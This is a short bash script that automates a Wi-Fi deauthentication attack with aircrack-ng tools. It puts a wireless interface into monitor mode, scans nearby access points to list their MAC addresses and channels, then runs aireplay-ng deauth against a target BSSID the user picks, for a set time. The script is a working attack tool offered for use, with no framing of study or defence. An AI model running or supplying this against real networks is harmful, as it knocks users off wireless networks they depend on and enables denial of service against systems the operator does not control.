#!/bin/bash

function scriptOver() { #just created function so I can just call it 
	#This function resets everything once the previous functions are over
	echo "Returning everything to normal" 
	sleep 2
	clear
	rm -f *myOutput*

	airmon-ng stop $interface
	service NetworkManager start
	service wpa_supplicant start
	ifconfig $interface down
	ifconfig $interface up
	echo "Goodbye!" 
       	sleep 3
	exit 0
}

echo "Which interface would you like to put into monitor mode?"
read interface
if [[ `iwconfig|grep $interface` ]] &>/dev/null; then
	sleep 2
	echo "Checking to make sure linux see's the network adapter ...... "
	sleep 2
	lsusb|grep -i realtek #checking to see if Linux sees the adapter at all 
	sleep 2
	iwconfig|grep -i realtek #checking to make sure Linux sees the usb as a network adapter
	echo  "Done!"

	airmon-ng check kill #kill wifi processes
	airmon-ng start $interface #puts selected interface into monitor mode
	#iwconfig
	airodump-ng $interface -w myOutput --output-format csv & sleep 15
	kill %1 #killing the previous command.
	
	cat myOutput-01.csv | awk '{ print $1,$6,$19 }' | awk 'NR==1,/Station/' | head -n -1 #printing out results of the scan with the macaddr and channel number
	
	#airodump-ng -c $channelNum --bssid $macaddr $interface & sleep 15 #now scanning specific channel
	#pkill -9 airodump-ng #kills the previous command
	
	echo "Would you like to attack the network with DEAUTH attack? (y/n)" 
       	read response		
	if [ $response = "y" ] || [ $response = "Y" ] ; then 
		echo "Which of the Mac addresses would you like to use?"
		read macaddr
		echo "Which channel would you like to use?"
		read channelNum
		
		iwconfig $interface channel $channelNum
		
		echo "How long would you like to do the deauth attack? (in seconds)" & read time
		aireplay-ng -0 0 -a $macaddr $interface & sleep $time
		pkill aireplay-ng
		scriptOver
	
	else
	
		echo "Goodbye!"
		scriptOver
	fi
else
	echo "This interface does not exsist try again with an actual interface name!"
	exit 0
fi




#echo "Hello Would you like to run this program?"
#read choice
#	if [ $choice="y" ] | [ $choice="Y" ]; then 
#		echo "Ok"
#		normalRun
#	else	
#		echo "Goodbye!"
#		exit 0
#	fi
#	
##trap ctrl_cINT

#function ctrl_c() { #Reset everything before user exits if ctrl_c is pressed
#	echo "Ctrl + C happend"
#	echo "Are you sure you would like to exit? (y/n)"
#	read response2
#	if [ $response2="y" ] | [ $response2="Y" ]; then 
#		echo "Now continuing script"
#	
#	else
#		echo "Reseting everything"
#		scriptOver
#		echo "Now Exiting" & echo "Goodbye!"
#		exit 0
#	fi
#}
